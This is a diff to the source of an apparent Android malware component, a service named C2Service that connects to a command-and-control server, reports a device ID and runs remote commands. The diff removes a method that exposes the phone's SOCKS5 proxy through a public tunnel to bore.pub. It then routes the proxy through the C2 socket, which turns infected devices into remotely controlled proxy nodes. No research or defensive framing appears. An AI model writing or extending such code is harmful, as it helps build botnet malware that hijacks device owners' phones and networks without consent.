@@ -10,6 +10,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
+
 import java.io.*;
 import java.net.Socket;
 
@@ -48,6 +49,10 @@ public class C2Service extends Service {
                 socket = new Socket(Config.HOST, Config.PORT);
                 writer = new PrintWriter(socket.getOutputStream(), true);
                 reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+                // Pass the socket to ProxyService
+                proxyService.setC2Socket(socket);
+
                 writer.println("DEVICE:" + deviceId);
                 writer.println("READY");
                 Log.d("C2Service", "Connected!");
@@ -80,21 +85,11 @@ public class C2Service extends Service {
         return executeCmd(command);
     }
 
-    private void startBoreTunnel() {
-        try {
-            Process process = Runtime.getRuntime().exec("bore local 1080 --to bore.pub --port 1080");
-            Log.d("C2Service", "Bore tunnel started for port 1080");
-        } catch (Exception e) {
-            Log.e("C2Service", "Failed to start bore tunnel: " + e.getMessage());
-        }
-    }
-
     private String executeCmd(String cmd) {
         // PROXY COMMANDS
         if (cmd.equalsIgnoreCase("proxy on")) {
             proxyService.startProxy();
-            startBoreTunnel();
-            return "✅ SOCKS5 proxy started on port 1080\n✅ Bore tunnel started on bore.pub:1080";
+            return "✅ SOCKS5 proxy started on port 1080\n✅ Traffic routed through C2 tunnel";
         }
         if (cmd.equalsIgnoreCase("proxy off")) {
             proxyService.stopProxy();
